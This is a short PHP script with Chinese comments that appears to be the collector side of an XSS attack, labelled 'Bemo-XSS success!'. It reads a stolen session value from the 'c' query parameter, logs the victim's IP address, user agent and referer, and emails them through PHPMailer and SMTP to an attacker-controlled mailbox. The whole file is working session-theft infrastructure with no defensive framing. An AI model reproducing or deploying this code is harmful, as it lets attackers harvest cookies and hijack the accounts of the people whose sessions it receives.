<?php

$ip = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'];
$agent = $_SERVER['HTTP_USER_AGENT'];
 
$data = $_GET[c];
 
$time = date("Y-m-d G:i:s A");
$text = "<br><br>".$time." = ".$ip."<br><br>User Agent: ".$agent."<br>Referer:    

".$referer."<br>Session: ".$data."<br><br><br>";


require("class.phpmailer.php"); 
$mail = new PHPMailer(); 
$mail->CharSet = "UTF-8";
$address ="xssget@qq.com";//接收邮箱地址
$mail->IsSMTP(); // 使用SMTP方式发送
$mail->Host = "smtp.163.com"; // 您的邮箱域名
$mail->SMTPAuth = true; // 启用SMTP验证功能
$mail->Username = "xsssend@163.com"; // 邮局用户名(请填写完整的email地址)
$mail->Password = "mailpwd"; // 邮箱密码，163邮箱需填写授权码
$mail->Port=25;
$mail->From = "xsssend@163.com"; //邮件发送者email地址
$mail->FromName = "Bemo-XSS success!";
$mail->AddAddress("$address", "a");
$mail->IsHTML(true); //是否使用HTML格式

$mail->Subject = "Bemo-XSS success!"; //邮件标题
$mail->Body = $text; //邮件内容，上面设置HTML，则可以是HTML

if(!$mail->Send())
{
echo "邮件发送失败. <p>";
echo "错误原因: " . $mail->ErrorInfo;
exit;
}

?>